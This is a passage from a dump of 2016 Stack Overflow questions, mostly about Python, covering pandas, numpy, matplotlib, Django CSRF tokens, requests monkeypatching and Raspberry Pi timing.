<li>An entity is deleted from a waiting queue because it is matched to a request. The transaction is committed but not yet applied. That same entity is matched with another request and deleted. Will this throw an error?</li>
<li>These strongly consistent accesses are limited to ~1 write/sec. Is there a better architecture that would eliminate this constraint?</li>
</ol>

<p>One thing I've considered for the latter question is to maintain multiple queues (whose number grows and shrinks with demand).</p>
"
39849875,6888454.0,2016-10-04 10:25:15+00:00,3,Disappearing {% csrf_token %} on website file,"<p>When I wanted use my registration form in my site, I get ERROR 403: ""CSRF verification failed. Request aborted."" In source of this website I realised that  is missing. This is part of view-source from my site:</p>

<pre><code>&lt;div style=""margin-left:35%;margin-right:35%;""&gt;
&lt;fieldset&gt;
&lt;legend&gt; Wszystkie pola oprÃ³cz numeru telefonu naleÅ¼y wypeÅniÄ &lt;/legend&gt;
    &lt;form method=""post"" action="".""&gt;
        &lt;p&gt;&lt;label for=""id_username""&gt;Login:&lt;/label&gt; &lt;input id=""id_username"" maxlength=""30"" name=""username"" type=""text"" required/&gt;&lt;/p&gt;
&lt;p&gt;&lt;label for=""id_email""&gt;Email:&lt;/label&gt; &lt;input id=""id_email"" name=""email"" type=""email"" required /&gt;&lt;/p&gt;
&lt;p&gt;&lt;label for=""id_password1""&gt;HasÅo:&lt;/label&gt; &lt;input id=""id_password1"" name=""password1"" type=""password"" required /&gt;&lt;/p&gt;
&lt;p&gt;&lt;label for=""id_password2""&gt;PowtÃ³rz hasÅo:&lt;/label&gt; &lt;input id=""id_password2"" name=""password2"" type=""password"" required /&gt;&lt;/p&gt;
&lt;p&gt;&lt;label for=""id_phone""&gt;Telefon:&lt;/label&gt; &lt;input id=""id_phone"" maxlength=""20"" name=""phone"" type=""text"" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;label for=""id_log_on""&gt;Logowanie po rejestracji:&lt;/label&gt;&lt;input id=""id_log_on"" name=""log_on"" type=""checkbox"" /&gt;&lt;/p&gt;
        &lt;input type=""submit"" value=""Rejestracja""&gt;&lt;input type=""reset"" value=""WartoÅci poczÄtkowe""&gt;
    &lt;/form&gt;
&lt;/fieldset&gt;
&lt;/div&gt;
</code></pre>

<p>I was surprised of that, because in my files on Pythonanythere this fragment of code is present.</p>

<p>This is part of my file register.html on Pythonanythere:</p>

<pre><code>&lt;div style=""margin-left:35%;margin-right:35%;""&gt;
&lt;fieldset&gt;
&lt;legend&gt; Wszystkie pola oprÃ³cz numeru telefonu naleÅ¼y wypeÅniÄ &lt;/legend&gt;
    &lt;form method=""post"" action="".""&gt;{% csrf_token %}
        {{ form.as_p }}
        &lt;input type=""submit"" value=""Rejestracja""&gt;&lt;input type=""reset"" value=""WartoÅci poczÄtkowe""&gt;
    &lt;/form&gt;
&lt;/fieldset&gt;
&lt;/div&gt;
</code></pre>

<p>What am I doing wrong that my webpage don't see this piece of code? It is seamed on server but on webpage view-source It isn't.</p>

<p>EDIT:
This is view, which render my template:</p>

<pre><code>def register(request):
    if request.method == 'POST':
    form = FormularzRejestracji(request.POST)
    if form.is_valid():
        user = User.objects.create_user(
            username=form.cleaned_data['username'],
            password=form.cleaned_data['password1'],
            email=form.cleaned_data['email']
        )
        user.last_name = form.cleaned_data['phone']
        user.save()
        if form.cleaned_data['log_on']:
            user = authenticate(username=form.cleaned_data['username'], password=form.cleaned_data['password1'])
            login(request, user)
            template = get_template(""osnowa_app/point_list.html"")
            variables = RequestContext(request, {'user': user})
            output = template.render(variables)
            return HttpResponseRedirect(""/"")
        else:
            template = get_template(""osnowa_app/register_success.html"")
            variables = RequestContext(request, {'username': form.cleaned_data['username']})
            output = template.render(variables)
            return HttpResponse(output)

else:
    form = FormularzRejestracji()
template = get_template(""osnowa_app/register.html"")
form = FormularzRejestracji()
variables = RequestContext(request, {'form': form})
output = template.render(variables)
return HttpResponse(output)
</code></pre>
"
39648038,2941500.0,2016-09-22 20:09:04+00:00,3,Improving frequency time normalization/hilbert transfer runtimes,"<p>So this is a bit of a nitty gritty question...</p>

<p>I have a time-series signal that has a non-uniform response spectrum that I need to whiten. I do this whitening using a frequency time normalization method, where I incrementally filter my signal between two frequency endpoints, using a constant narrow frequency band (~1/4 the lowest frequency end-member). I then find the envelope that characterizes each one of these narrow bands, and normalize that frequency component. I then rebuild my signal using these normalized signals... all done in python (sorry, has to be a python solution)...</p>

<p>Here is the raw data:
<a href=""http://i.stack.imgur.com/MQut2.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/MQut2.png"" alt=""enter image description here""></a></p>

<p>and here is its spectrum:
<a href=""http://i.stack.imgur.com/SKvfC.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/SKvfC.png"" alt=""enter image description here""></a></p>

<p>and here is the spectrum of the whitened data:
<a href=""http://i.stack.imgur.com/hy3c9.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/hy3c9.png"" alt=""enter image description here""></a></p>

<p>The problem is, that I have to do this for maybe ~500,000 signals like this, and it takes a while (~a minute each)... With almost the entirety of the time being spend doing the actual (multiple) Hilbert transforms </p>

<p>I have it running on a small cluster already. I don't want to parallelize the loop the Hilbert is in.</p>

<p>I'm looking for alternative envelope routines/functions (non Hilbert), or alternative ways to calculate the entire narrowband response function without doing a loop.</p>

<p>The other option is to make the frequency bands adaptive to the center frequency over which its filtering, so they get progressively larger as we march through the routines; which would just decrease the number of times I have to go through the loop.</p>

<p>Any and all suggestions welcome!!!</p>

<p>example code/dataset:
<a href=""https://github.com/ashtonflinders/FTN_Example"" rel=""nofollow"">https://github.com/ashtonflinders/FTN_Example</a></p>
"
39642721,5380366.0,2016-09-22 15:09:08+00:00,3,Adding alpha channel to RGB array using numpy,"<p>I have an image array in RGB space and want to add the alpha channel to be all zeros. Specifically, I have a <code>numpy</code> array with shape (205, 54, 3) and I want to change the shape to (205, 54, 4) with the additional spot in the third dimension being all 0.0's. Which numpy operation would achieve this?</p>
"
39850270,820410.0,2016-10-04 10:45:49+00:00,3,Python: Monkeypatching a method of an object,"<p>I'm hitting an API in python through requests' Session class. I'm making GET &amp; POST method call using requests.Session().</p>

<p>On every call(GET/POST) failure, I want to notify another process. I can do this by creating a utility method as follows:</p>

<pre><code>s = request.Session()
def post():
    try:
        s.post(URL,data,headers)
    except:
        notify_another_process()
</code></pre>

<p>And call this method instead of <code>requests.Session().post</code> directly. </p>

<p>But, I want to monkeypatch this code to <code>requests.Session().post</code> and want the additional functionality of notifying the other process in the <code>requests.Session().post</code> method call itself. How can I achieve this?</p>

<p><strong>EDIT 1 :</strong></p>

<p>requests.Session()'s post method has the following signature:</p>

<pre><code>def post(self, url, data=None, json=None, **kwargs):
    return self.request('POST', url, data=data, json=json, **kwargs)
</code></pre>

<p>If I somehow try to make my a custom post like the following:</p>

<pre><code>def post_new(self, url, data=None, json=None, **kwargs):
    try:
        s.post(url,data, json,kwargs)
    except:
        notify_another_process()
</code></pre>

<p>and do a patch as follows:</p>

<pre><code>requests.post = post_new
</code></pre>

<p>This isn't really a good monkeypatching because I'm not using <code>self</code> but <code>session's object</code> inside <code>session.post</code>.</p>
"
39898514,3575426.0,2016-10-06 14:20:28+00:00,3,Python: How to initialize a list with generator function,"<p>Let's say i have 2 following functions:</p>

<pre><code>def get_items():
    items = []
    for i in xrange(2, 10):
        items.append(i)
    return items

def gen_items():
    for i in xrange(2, 10):
        yield i
</code></pre>

<p>I know i can use both of them in a for loop like this</p>

<pre><code>for item in gen_items():
    do something
</code></pre>

<p>But now i need to initialize a variable as list, like this</p>

<pre><code>mylist = get_items()
</code></pre>

<p>but with the generator function. Is there a way to do it without a for loop appending the items from generator?</p>
"
39586398,6507553.0,2016-09-20 05:35:18+00:00,3,How to compare decimal numbers available in columns of pandas dataframe?,"<p>I want to compare decimal values which are available in two columns of pandas dataframe.</p>

<p>I have a dataframe:</p>

<pre><code>data = {'AA' :{0:'-14.35',1:'632.0',2:'619.5',3:'352.35',4:'347.7',5:'100'},
        'BB' :{0:'-14.3500',1:'632.0000',2:'619.5000',3:'352.3500',4:'347.7000',5:'200'}
       }
df1 = pd.DataFrame(data)
print df1
</code></pre>

<p><strong>dataframe look like this :</strong></p>

<pre><code>       AA        BB
0  -14.35  -14.3500
1   632.0  632.0000
2   619.5  619.5000
3  352.35  352.3500
4   347.7  347.7000
5   100    200
</code></pre>

<p>I want to compare <code>AA</code> and <code>BB</code> columns. As shown in above dataframe, values of both columns are same except <strong>5th</strong> row. only issue is the trailing zeros. </p>

<p>If both <code>AA</code> and <code>BB</code> columns are same then I want result of these comparison in third column as a <code>Result</code> i.e. <code>True</code> or <code>False</code>.</p>

<p><strong>Expected Result :</strong>  </p>

<pre><code>       AA        BB   Result
0  -14.35  -14.35    True
1   632.0  632.0     True
2   619.5  619.5     True
3  352.35  352.35    True
4   347.7  347.7     True
5   100    200       False
</code></pre>

<p>How I can compare these decimal values?</p>
"
39647774,6765724.0,2016-09-22 19:52:01+00:00,3,Python histogram is located on the right side of exact solution,"<p>I am working on a project in thermal physics, and for that I need to compare a histogram with a smooth curve. My problem is that the histogram is placed to the right for the curve (the curve is consistent going though the upper left corner of the bars):</p>

<p><img src=""http://i.stack.imgur.com/4wHGV.png"" alt=""Figure 1""></p>

<p>I want the curve to go though the middle of the top of the bars, like it should. It might looks like a trifle, but it really irritates me. I hope someone can help me! </p>

<p>The program looks like this:</p>

<pre><code>import numpy as np
import matplotlib.pyplot as plt

#--Constants--
M = 20      # Jmax
N = 1000    # Number of J values
T = 50      # Actually T/theta_r

J1 = np.linspace(0,M,N)
J2 = np.linspace(0,M,M+1)

#--Calculate z--
def z(J):
    return(2*J+1)*np.exp(-J*(J+1)/T)

#--Plot--
width = .9                           #Width of columns
plt.bar(J2, z(J2), width=width)      #Plotting histogram
#plt.xticks(ind + width / 2, ind)     #Replacing the indexes under the columns
plt.plot(J1,z(J1),'-r', linewidth=2)
SZ={'size':'16'}
plt.title('Different terms $z(j)$ plotted as function of $j$',**SZ)
plt.xlabel('$j$',**SZ)
plt.ylabel('$z(j)$',**SZ)
plt.show()
</code></pre>
"
39875272,6129051.0,2016-10-05 13:26:43+00:00,3,Python script stops after a few minutes,"<p>I'm building a python script to check the price of an amazon item every 5-10 seconds. Problem is, the script stops 'working' after a few minutes. There is no output to the console but it shows up as 'running' in my processes.</p>

<p>I'm using requests sessions for making http requests and time to display the time of request. </p>

<p>My code is as follows;</p>

<pre><code>target_price = raw_input('Enter target price: ')
url = raw_input('Enter the product url: ')
while True:
    delay=randint(5,10)

    print datetime.datetime.strftime(datetime.datetime.now(), '%Y-%m-%d %H:%M:%S')+': '+'Sleeping for ' + str(delay) + ' seconds'
    time.sleep(delay)
    try:
        with requests.Session() as s:
            page = s.get(url,headers=headers,proxies=proxyDict,verify=False,timeout=5)
            tree = html.fromstring(page.content)
            price = tree.xpath('//div[@class=""a-row a-spacing-mini olpOffer""]/div[@class=""a-column a-span2 olpPriceColumn""]/span[@class=""a-size-large a-color-price olpOfferPrice a-text-bold""]/text()')[0]
            new_price = re.findall(""[-+]?\d+[\.]?\d+[eE]?[-+]?\d*"", price)[0]
            old_price = new_price
            print new_price
            if float(new_price)&lt;float(target_price):
                print 'Lower price found!'
                mydriver = webdriver.Chrome()
                send_simple_message()
                login(mydriver)
                print 'Old Price: ' + old_price
                print 'New Price: ' + new_price
            else:
                print 'Trying again'
    except Exception as e:
        print e
        print 'Error!'
</code></pre>

<p>EDIT: I've removed the wait() function and used time.sleep instead.</p>

<p>EDIT2: When I use Keyboard interrupt to stop the script, here's the output</p>

<pre><code>    Traceback (most recent call last):
  File ""checker.py"", line 85, in &lt;module&gt;
    page = s.get(url,headers=headers,proxies=proxyDict,verify=False,timeout=5)
  File ""C:\Python27\lib\site-packages\requests\sessions.py"", line 488, in get
return self.request('GET', url, **kwargs)
  File ""C:\Python27\lib\site-packages\requests\sessions.py"", line 475, in request
resp = self.send(prep, **send_kwargs)
  File ""C:\Python27\lib\site-packages\requests\sessions.py"", line 596, in send
    r = adapter.send(request, **kwargs)
  File ""C:\Python27\lib\site-packages\requests\adapters.py"", line 423, in send
timeout=timeout
  File ""C:\Python27\lib\site-packages\requests\packages\urllib3\connectionpool.py"", line 589, in urlopen
self._prepare_proxy(conn)
  File ""C:\Python27\lib\site-packages\requests\packages\urllib3\connectionpool.py"", line 797, in _prepare_proxy
conn.connect()
  File ""C:\Python27\lib\site-packages\requests\packages\urllib3\connection.py"",
line 267, in connect
self._tunnel()
  File ""C:\Python27\lib\httplib.py"", line 729, in _tunnel
line = response.fp.readline()
KeyboardInterrupt
</code></pre>

<p>Is it requests that is running into an infinite loop?</p>
"
39917988,2690373.0,2016-10-07 13:02:58+00:00,3,"Understanding variable types, names and assignment","<p>In Python, if you want to define a  variable, you don't have to specify the type of it, unlike other languages such as C and Java.</p>

<p>So how can the Python interpreter distinguish between variables and give it the required space in memory like <code>int</code> or <code>float</code>?</p>
"
39918053,6391098.0,2016-10-07 13:06:39+00:00,3,Pandas dataframe rearrangement stack to two value columns (for factorplots),"<p>I have been trying to rearrange my dataframe to use it as input for a factorplot. The raw data would look like this:</p>

<pre><code>  A B C  D
1 0 1 2 ""T""
2 1 2 3 ""F""
3 2 1 0 ""F""
4 1 0 2 ""T""
...
</code></pre>

<p>My question is how can I rearrange it into this form:</p>

<pre><code>  col val val2
1  A   0  ""T""
1  B   1  ""T""
1  C   2  ""T""
2  A   1  ""F""
...
</code></pre>

<p>I was trying:</p>

<pre><code>df = DF.cumsum(axis=0).stack().reset_index(name=""val"")
</code></pre>

<p>However this produces only one value column not two.. thanks for your support</p>
"
39851182,5044921.0,2016-10-04 11:32:59+00:00,3,Why do methods of classes that inherit from numpy arrays return different things?,"<p>Let's look at some very simple behaviour of numpy arrays:</p>

<pre><code>import numpy as np
arr = np.array([1,2,3,4,5])
max_value = arr.max() # returns 5
</code></pre>

<p>Now I create a class which inherits from <code>np.ndarray</code>:</p>

<pre><code>class CustomArray(np.ndarray):
    def __new__(cls, *args, **kwargs):
        obj = np.array(*args, **kwargs).view(cls)
        return obj
new_arr = CustomArray([1,2,3,4,5])
</code></pre>

<p>I haven't actually changed any behaviour - I just made a nominal change in what class the object is.</p>

<p>And yet:</p>

<pre><code>new_max_value = new_arr.max() # returns CustomArray(5)
</code></pre>

<p>The return value is an <code>CustomArray</code> instance? Why? <code>arr.max()</code> didn't return a <code>np.ndarray</code> instance, just a plain numpy integer.</p>

<p>Similarly, why do both <code>arr == new_arr</code> and <code>new_arr == arr</code> return <code>CustomArray</code> instances? Shouldn't the former call <code>arr.__eq__(new_arr)</code>, which should return a <code>np.ndarray</code> instance?</p>

<p>EDIT:</p>

<p>Note that I override the <code>__new__</code> method for the sake of easy constructors. E.g. the equivalent of <code>np.array([1,2,3,4,5])</code> can just be <code>CustomArray([1,2,3,4,5])</code>, whereas if I plainly inherit from <code>np.ndarray</code> I'd have to do something like <code>new_arr = CustomArray((5,))</code>; <code>new_arr[:] = np.array([1,2,3,4,5])</code>.</p>
"
40074054,6791417.0,2016-10-16 18:41:46+00:00,3,"Python Trouble getting cursor position (x, y) on desktop","<p>I've been looking for ways to find my cursor position and put it on to two variables, x and y. But most answers are outdated and i can't seem to make them work. I would rather if it is in pythons standard librarys or pywinauto. I would also prefer in python 2.7. Thanks.</p>
"
40074155,6911741.0,2016-10-16 18:51:18+00:00,3,How to improve distance function in python,"<p>I am trying to do a classification exercise on email docs (strings containing words). </p>

<p>I defined the distance function as following:</p>

<pre><code>def distance(wordset1, wordset2):

 if len(wordset1) &lt; len(wordset2):
    return len(wordset2) - len(wordset1)
 elif len(wordset1) &gt; len(wordset2):
    return len(wordset1) - len(wordset2)
 elif len(wordset1) == len(wordset2):
    return 0    
</code></pre>

<p>However, the accuracy in the end is pretty low (0.8). I guess this is because of the not so accurate distance function. How can I improve the function? Or what are other ways to calculate the ""distance"" between email docs?</p>
"
39647269,3182105.0,2016-09-22 19:20:46+00:00,3,Pandas: Compare a column to all other columns of a dataframe,"<p>I have a scenario where I have new subjects being tested for a series of characteristics where the results are all string categorical values.  Once the testing is done I needs to compare the new dataset to a master dataset of all subjects and look for similarities (matches) of a given thresh hold (say 90%).  </p>

<p>Therefore, I need to be able to do a columnar (subject-wise) comparison of each one of the new subjects in the new data set to each column in the master data set plus the others in the new data set in the best performance possible because production data set has about half million columns (and growing) and 10,000 rows.</p>

<p>Here is some example code:</p>

<pre><code>master = pd.DataFrame({'Characteristic':['C1', 'C2', 'C3'], 
                                   'S1':['AA','BB','AB'],
                                   'S2':['AB','-','BB'],
                                   'S3':['AA','AB','--']})
new = pd.DataFrame({'Characteristic':['C1', 'C2', 'C3'], 
                                'S4':['AA','BB','AA'],
                                'S5':['AB','-','BB']})
new_master = pd.merge(master, new, on='Characteristic', how='inner')  

def doComparison(comparison_df, new_columns, master_columns):
  summary_dict = {}
  row_cnt = comparison_df.shape[0]

  for new_col_idx, new_col in enumerate(new_columns):
      # don't compare the Characteristic column
      if new_col != 'Characteristic':
        print 'Evalating subject ' + new_col + ' for matches'
        summary_dict[new_col] = []
        new_data = comparison_df.ix[:, new_col]
        for master_col_idx, master_col in enumerate(master_columns):
            # don't compare same subject or Characteristic column
            if new_col != master_col and master_col != 'Characteristic':
                master_data = comparison_df.ix[:, master_col]
                is_same = (new_data == master_data) &amp; (new_data != '--') &amp; (master_data != '--')
                pct_same = sum(is_same) * 100 / row_cnt
                if pct_same &gt; 90:
                    print '  Found potential match ' + master_col + ' ' + str(pct_same) + ' pct'
                    summary_dict[new_col].append({'match' : master_col, 'pct' : pct_same})
  return summary_dict

result = doComparison(new_master, new.columns, master.columns)
</code></pre>

<p>This way works but I would like to increase the efficiency and performance and don't exactly know how.</p>
"
39921607,3990607.0,2016-10-07 16:08:19+00:00,3,Tensorflow: How to make a custom activation function with only python?,"<p>So in Tensorflow it is possible to make your own activation function. But it is quite complicated, you have to write it in C++ and recompile the whole of tensorflow <a href=""https://www.quora.com/Is-it-possible-to-add-new-activation-functions-to-TensorFlow-Theano-Torch-How"" rel=""nofollow"">[1]</a> <a href=""https://www.tensorflow.org/versions/r0.11/how_tos/adding_an_op/index.html"" rel=""nofollow"">[2]</a>.</p>

<p>Is there a simpler way?</p>
"
39939780,626369.0,2016-10-09 03:38:37+00:00,3,How do I create an animated gif in Python using Wand?,"<p>The instructions are simple enough in the <a href=""http://docs.wand-py.org/en/0.4.1/guide/sequence.html"" rel=""nofollow"">Wand docs</a> for <em>reading</em> a sequenced image (e.g. animated gif, icon file, etc.):</p>

<pre><code>&gt;&gt;&gt; from wand.image import Image
&gt;&gt;&gt; with Image(filename='sequence-animation.gif') as image:
...     len(image.sequence)
</code></pre>

<p>...but I'm not sure how to <em>create</em> one. </p>

<p>In Ruby this is easy using <strong>RMagick</strong>, since you have <code>ImageList</code>s. (see <a href=""https://gist.github.com/dguzzo/99bbca3df827df475f768383a1b04102"" rel=""nofollow"">my gist</a> for an example.)</p>

<p>I tried creating an <code>Image</code> (as the ""container"") and instantiating each <code>SingleImage</code> with an image path, but I'm pretty sure that's wrong, especially since the constructor documentation for <code>SingleImage</code> doesn't look for use by the end-user.</p>

<p>I also tried creating a <code>wand.sequence.Sequence</code> and going from that angle, but hit a dead-end as well. I feel very lost.</p>
"
39936220,4860270.0,2016-10-08 19:00:51+00:00,3,Is it safe and pythonic to consume the iterator in the body of a for loop?,"<p>Is it safe in Python to do something like this (say, in a parser)?</p>

<pre><code>iterator = iter(some_iterable)
for x in iterator:
    # do stuff with x
    if some_condition(x):
        y = next(iterator)
        # do stuff with y
</code></pre>

<p>I've tested in Python 2 and 3 and it does what I expect, but I wonder whether it's really safe and whether it's idiomatic. The above code should be equivalent to the following rather more verbose alternative:</p>

<pre><code>iterator = iter(some_iterable)
while True:
    try:
        x = next(iterator)
    except StopIteration:
        break
    # do stuff with x
    if some_condition(x):
        y = next(iterator)
        # do stuff with y
</code></pre>
"
39939768,6943521.0,2016-10-09 03:36:08+00:00,3,Failed with Python 2.7.x installation on Windows 10 machine for npm dependency,"<p>I am trying to install Python 2.7.x versions (multiple) on my Windows 10 laptop to fix npm Python dependency error. But unfortunately i am getting the following error:</p>

<blockquote>
  <p>The system cannot find the device or file specified.</p>
</blockquote>

<p><img src=""http://i.stack.imgur.com/tda2P.png"" alt=""enter image description here""></p>

<p>How do I resolve this issue. My system is Windows 10 64 bit laptop.</p>
"
39922504,5087267.0,2016-10-07 17:00:17+00:00,3,Missing levels in python contour plot,"<p>I am trying to plot contours with specified levels of a simulated velocity field, my values are in the range of [75,150], and I specified my levels to be <code>levels=[75,95,115,135,150]</code>,but it's only giving me the 95,115,135 lines. I checked my 2d array and I do have points with values of 75 and 150 lying on straight lines, but the plot is just not showing them. I am wondering why would that be the case. Thanks a lot!!
Here is my code:</p>

<pre><code>import numpy as np
import matplotlib.pyplot as plt
from matplotlib.patches import Ellipse

#some parameters...does not matter 
i=60*np.pi/180 #inclination
r=100 #radius
vc=150
vr=0

x=np.arange(-100,100,1)
y=np.arange(-100,100,1)

xx,yy=np.meshgrid(x,y)

#simulate velocity fields....does not matter either
def projv((x, y),v_c, v_r, inc):
   projvy = v_c*x*np.cos(inc)/np.sqrt(x**2+y**2) + v_r*y*np.cos(inc)/np.sqrt(x**2+y**2)
   projvx = v_c*y/np.sqrt(x**2+y**2) + v_r*x/np.sqrt(x**2+y**2)
   v = np.sqrt(projvx**2 + projvy**2)
   return v.ravel()

 #here is my 2d array
 vel = projv((xx,yy),vc, vr, i).reshape(200,200)

#levels I specified
levels=[75,95,115,135,150]
cs=plt.contour(x,y,vel,levels)
plt.clabel(cs,inline=1,fontsize=9)
plt.show()
</code></pre>

<p>Then I got this:<a href=""http://i.stack.imgur.com/1exAh.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/1exAh.png"" alt=""This is not showing the 75 and 150 contour levels that I specified. Why?""></a></p>
"
39653812,4706745.0,2016-09-23 06:16:50+00:00,3,How to sort/ group a Pandas data frame by class label or any specific column,"<pre><code>class col2 col3 col4 col5
1     4    5    5    5
4     4    4.5  5.5  6
1     3.5  5    6    4.5
3     3    4    4    4
2     3    3.5  3.8  6.1
</code></pre>

<p>I have used hypothetical data in the example. The shape of the real DataFrame is 6680x1900. I have clustered these data into <code>50</code> labeled classes (1 to 50). How can I sort this data in ascending order of <code>class</code> labels?</p>

<p>I have tried:</p>

<pre><code>df.groupby([column_name_lst])[""class""]
</code></pre>

<p>But it fails with this error:</p>

<blockquote>
  <p>TypeError: You have to supply one of 'by' and 'level'</p>
</blockquote>

<p>How to solve this problem? Expected output is:</p>

<pre><code>class col2 col3 col4 col5
1     4    5    5    5
1     3.5  5    6    4.5
2     3    3.5  3.8  6.1
3     3    4    4    4
4     4    4.5  5.5  6
</code></pre>
"
39868209,3559896.0,2016-10-05 07:47:38+00:00,3,Cpp compilation from python fail but not in the shell,"<p>I have a <code>cpp</code> file that compiles fine with <code>g++</code> by using the shell:</p>

<pre><code>extern ""C""{
  #include &lt;quadmath.h&gt;
}

inline char* print( const __float128&amp; val)
{
  char* buffer = new char[128];
  quadmath_snprintf(buffer,128,""%+.34Qe"", val);
  return buffer;
}
int main(){
    __float128 a = 1.0;
    print(a);
    return 0;
}
</code></pre>

<p>However, when I try to compile it via a <code>python</code> scrit, it fails with the following error:</p>

<blockquote>
  <p>""undefined reference to quadmath_snprintf""</p>
</blockquote>

<p>Here the code of the <code>python</code> script:</p>

<pre><code>import commands
import string
import os
(status, output) = commands.getstatusoutput(""(g++ test/*.c -O3 -lquadmath -m64)"")
</code></pre>

<p>Any idea how to solve this? Thanks.</p>
"
39939093,6943229.0,2016-10-09 01:35:07+00:00,3,"Ocatave Symbolic ""Python cannot import SymPy""","<p>After installing octave, sympy (through anaconda), and the symbolic package, I'm trying to run this line in octave as part of a script:</p>

<pre><code>syms nn nb x
</code></pre>

<p>When I do I get this message:</p>

<pre><code>warning: the 'syms' function belongs to the symbolic package from Octave Forge
which you have installed but not loaded.  To load the package, run `pkg
load symbolic' from the Octave prompt.
</code></pre>

<p>After:</p>

<pre><code>pkg load symbolic
syms nn nb x
</code></pre>

<p>I get:</p>

<pre><code>Traceback (most recent call last):
  File ""&lt;string&gt;"", line 1, in &lt;module&gt;
  File ""sympy/__init__.py"", line 27, in &lt;module&gt;
    raise ImportError(""It appears 2to3 has been run on the codebase. Use ""
 ImportError: It appears 2to3 has been run on the codebase. Use Python 3 or get the original source code.
OctSymPy v2.4.0: this is free software without warranty, see source.
Initializing communication with SymPy using a popen2() pipe.
error: Python cannot import SymPy: have you installed SymPy?
error: called from
     assert_have_python_and_sympy at line 37 column 5
     python_ipc_popen2 at line 78 column 5
     python_ipc_driver at line 57 column 13
     python_cmd at line 166 column 9
     sym at line 365 column 5
     syms at line 162 column 9
</code></pre>

<p>I'm using OSX El Capitan and I installed Octave through homebrew. </p>

<p>If I'm being honest, I have no clue what is going on here... Is it that octave is unable to properly communicate with sympy? If so I'm guessing there might be a simple way to fix this? If this isn't it what should I do? I'm open to restarting the process.</p>

<p>I'd like to apologize for any formatting issues ahead of time, this is my first time asking. I didn't see any questions covering this but if I missed something obvious, I'm sorry again. </p>

<p>Thank you!</p>
"
39863487,6293600.0,2016-10-05 00:00:13+00:00,3,pandas reorder subset of columns from a grouped data frame,"<p>I have forecast data that I grouped by month.
The original dataframe <em>something</em> like this:</p>

<pre><code>&gt;&gt;clean_table_grouped[0:5]
       STYLE    COLOR    SIZE   FOR
MONTH                           01/17    10/16   11/16    12/16
    0 #######   ######   ####   0.0      15.0    15.0     15.0
    1 #######   ######   ####   0.0      15.0    15.0     15.0
    2 #######   ######   ####   0.0      15.0    15.0     15.0
    3 #######   ######   ####   0.0      15.0    15.0     15.0
    4 #######   ######   ####   0.0      15.0    15.0     15.0

&gt;&gt;clean_table_grouped.ix[0:,""FOR""][0:5] 
 MONTH  01/17  10/16  11/16  12/16
0        0.0   15.0   15.0   15.0
1        0.0   15.0   15.0   15.0
2        0.0   15.0   15.0   15.0
3        0.0   15.0   15.0   15.0
4        0.0   15.0   15.0   15.0
</code></pre>

<p>I simply want reorder these 4 columns in the follow way: </p>

<p>(keeping the rest of the dataframe untouched)</p>

<pre><code>MONTH    10/16  11/16  12/16  01/17
0        15.0   15.0   15.0   0.0
1        15.0   15.0   15.0   0.0
2        15.0   15.0   15.0   0.0
3        15.0   15.0   15.0   0.0
4        15.0   15.0   15.0   0.0
</code></pre>

<p>My attempted solution was to reorder the columns of the subset following the post below:
<a href=""http://stackoverflow.com/questions/13148429/how-to-change-the-order-of-dataframe-columns"">How to change the order of DataFrame columns?</a></p>

<p>I went about it by grabbing the column list and sorting it first</p>

<pre><code> &gt;&gt;for_cols = clean_table_grouped.ix[:,""FOR""].columns.tolist()
 &gt;&gt;for_cols.sort(key = lambda x: x[0:2])   #sort by month ascending
 &gt;&gt;for_cols.sort(key = lambda x: x[-2:])   #then sort by year ascending
</code></pre>

<p>Querying the dataframe works just fine</p>

<pre><code>&gt;&gt;clean_table_grouped.ix[0:,""FOR""][for_cols]
MONTH   10/16   11/16  12/16  01/17
0        15.0    15.0    15.0    0.0
1        15.0    15.0    15.0    0.0
2        15.0    15.0    15.0    0.0
3        15.0    15.0    15.0    0.0
4        15.0    15.0    15.0    0.0
</code></pre>

<p>However, when I try to set values in the original table, I get a table of ""NaN"":</p>

<pre><code>&gt;&gt;clean_table_grouped.ix[0:,""FOR""] = clean_table_grouped.ix[0:,""FOR""][for_cols]
&gt;&gt;clean_table_grouped.ix[0:,""FOR""]
MONTH  01/17  10/16  11/16  12/16
0        NaN    NaN    NaN    NaN
1        NaN    NaN    NaN    NaN
2        NaN    NaN    NaN    NaN
3        NaN    NaN    NaN    NaN
4        NaN    NaN    NaN    NaN
5        NaN    NaN    NaN    NaN
</code></pre>

<p>I have also tried zipping to avoid chained syntax (.ix[][]).
This avoids the NaN, however, it doesn't change the dataframe -__-</p>

<pre><code>&gt;&gt;for_cols = zip([""FOR"", ""FOR"", ""FOR"", ""FOR""], for_cols)
&gt;&gt;clean_table_grouped.ix[0:,""FOR""] = clean_table_grouped.ix[0:,for_cols]
&gt;&gt;clean_table_grouped.ix[0:,""FOR""]
 MONTH  01/17  10/16  11/16  12/16
 0        0.0   15.0   15.0   15.0
 1        0.0   15.0   15.0   15.0
 2        0.0   15.0   15.0   15.0
 3        0.0   15.0   15.0   15.0
 4        0.0   15.0   15.0   15.0
</code></pre>

<p>I realize I'm using ix to reassign values. However, I've used this technique in the past on dataframes that are not grouped and it has worked just fine.</p>

<p>If this question as already been answered in another post (in a CLEAR way), please provide the link. I searched but could not find anything similar.</p>

<p><strong>EDIT:</strong>
I have found a solution. Manually reindex by creating a new multiindex dataframe in the order you want your columns sorted. I posted the solution below.</p>
"
39891809,5859808.0,2016-10-06 09:00:16+00:00,3,How to get more precise time measures with a Raspberry Pi?,"<p>Recently I am developing a device base on raspberrypi 2b+ which connected to mpu9250(welding by myself).</p>

<p>I could read 9-axis data correctly, but I noticed that each data input with different time differential:</p>

<p><a href=""http://i.stack.imgur.com/g2izc.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/g2izc.png"" alt=""""></a></p>

<p>the figure shows the time differential between each two data.
But I have used QTimer to make sure my code every 10ms reading mpu9250 once.</p>

<p>So I tried this code on RaspberryPi 2b+:</p>

<pre><code>import time
import matplotlib.pyplot as plt

time_arr = []
for i in range(5000):
    t0 = time.time()
    print ""K""
    t1 = time.time() - t0
    time_arr.append(t1)

plt.plot(time_arr)
plt.show()
</code></pre>

<p>And result:</p>

<p><a href=""http://i.stack.imgur.com/8Tx9n.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/8Tx9n.png"" alt=""enter image description here""></a></p>

<p>even these simple code still shows peaks on diagram, and it's put me down...</p>

<p>Could anyone helps me solve these issue or explains what's going on?</p>

